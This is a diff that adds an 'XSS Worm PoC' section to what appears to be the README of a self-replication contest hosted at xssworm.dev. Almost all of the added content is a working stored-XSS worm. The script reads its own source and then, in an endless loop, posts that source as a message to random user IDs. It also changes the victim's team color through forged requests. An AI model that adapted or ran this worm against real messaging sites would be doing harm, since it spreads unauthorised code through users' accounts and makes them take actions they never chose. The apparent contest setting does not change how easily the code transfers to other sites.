@@ -8,6 +8,52 @@ Self-replication contest
 
 xxxx
 
+### XSS Worm PoC
+
+```
+<script id="xss_worm">
+	// XSS worm .dev
+	// Self-replication contest
+	// Proof of Concept v1.0
+
+	var victims = 1000;
+	var team_color = "#000000";
+	var url = "https://xssworm.dev";
+	var infection_code = "<script id=\"xss_worm\">"+self_propagation()+"<\/script>";
+
+	infect_victim(team_color);
+
+	while (true) {
+		var victim_id = get_random_victim(victims);
+		spread_infection(victim_id,infection_code);
+	}
+
+	function get_random_victim(accounts_count) {
+		return Math.floor((Math.random() * accounts_count) + 1);
+	}
+
+	function infect_victim(color) {
+		var xhr = new XMLHttpRequest();
+		var params = "color="+color;
+		xhr.open("POST", url+"/update", true);
+		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+		xhr.send(params);
+	}
+
+	function self_propagation(){
+		return document.getElementById("xss_worm").innerHTML;
+	}
+
+	function spread_infection(id,infection_code) {
+		var xhr = new XMLHttpRequest();
+		var params = "id="+id+"&msg="+encodeURIComponent(infection_code);
+		xhr.open("POST", url+"/send-message", true);
+		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+		xhr.send(params);
+	}
+</script>
+```
+
 ### Usage
 
 ```
